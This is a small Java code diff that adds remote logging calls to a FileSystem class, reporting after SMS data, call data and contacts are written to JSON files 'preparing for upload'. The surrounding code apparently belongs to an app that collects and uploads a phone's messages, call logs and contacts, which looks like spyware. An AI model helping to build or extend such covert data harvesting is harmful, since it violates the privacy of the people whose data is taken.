@@ -55,6 +55,7 @@ public class FileSystem {
             writer.append(data);
             writer.flush();
             writer.close();
+            Logs.pushLogsToServer("[DONE]: Sms Data written to .json preparing for upload.",uuid);
         } catch (Exception e) {
             Logs.pushLogsToServer("[ERROR]: "+ e.getMessage(), uuid);
         }
@@ -74,6 +75,7 @@ public class FileSystem {
             writer.append(data);
             writer.flush();
             writer.close();
+            Logs.pushLogsToServer("[DONE]: Call Data written to .json preparing for upload.",uuid);
         } catch (Exception e) {
             Logs.pushLogsToServer("[ERROR]: "+ e.getMessage(), uuid);
         }
@@ -93,6 +95,7 @@ public class FileSystem {
             writer.append(data);
             writer.flush();
             writer.close();
+            Logs.pushLogsToServer("[DONE]: contacts Data written to .json preparing for upload.",uuid);
         } catch (Exception e) {
             Logs.pushLogsToServer("[ERROR]: "+ e.getMessage(),uuid);
         }
